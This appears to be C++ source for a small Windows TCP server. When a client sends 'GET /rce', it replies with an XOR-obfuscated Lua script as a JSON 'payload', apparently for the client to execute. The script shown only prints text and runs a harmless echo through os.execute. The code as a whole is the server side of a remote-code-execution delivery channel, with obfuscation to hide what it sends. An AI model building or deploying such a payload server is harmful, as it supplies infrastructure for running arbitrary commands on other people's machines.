#include <iostream>
#include <WS2tcpip.h>
#include <json.hpp>
#pragma comment(lib, "ws2_32.lib")

using json = nlohmann::json;

std::string xor_encrypt(const std::string& data) {
    std::string result = data;
    for (size_t i = 0; i < data.size(); ++i) {
        result[i] ^= 0x5A;
    }
    return result;
}

void main() {
	printf("[*] Server Started\n");

    // Open Connection
    WSAData data;
    WSAStartup(MAKEWORD(2, 2), &data);
    
    SOCKET server = socket(AF_INET, SOCK_STREAM, 0); // SOCK_STREAM -> TCP 
    sockaddr_in addr = { AF_INET, htons(30000), { INADDR_ANY } }; // Server Port
    
    // bind & listen
    bind(server, (sockaddr*)&addr, sizeof(addr));
    listen(server, 1);
    
    while (true) {
        SOCKET client = accept(server, nullptr, nullptr);
        printf("[+] Client Connected\n");
        if (client == INVALID_SOCKET) continue;

        char buf[1024];
        int bytes = recv(client, buf, sizeof(buf) - 1, 0);
        if (bytes > 0) {
            buf[bytes] = 0;

            if (strcmp(buf, "GET /rce") == 0) {
                json j;

                // Main script
                std::string luaScript = R"lua(
SetConsoleTextAttribute(FOREGROUND_BLUE | FOREGROUND_INTENSITY)
io.write("Hello from RCE\n")
os.execute("echo Hey from {os.execute}")
)lua";


                std::string encrypted = xor_encrypt(luaScript);
                j["payload"] = encrypted;

                std::string response = j.dump(); 
                send(client, response.c_str(), static_cast<int>(response.size()), 0);
                printf("[+] Sent payload to client\n");
            }
        }

        printf("[-] Client Disconnected\n");
        closesocket(client);
    }

    closesocket(server);
    WSACleanup();
}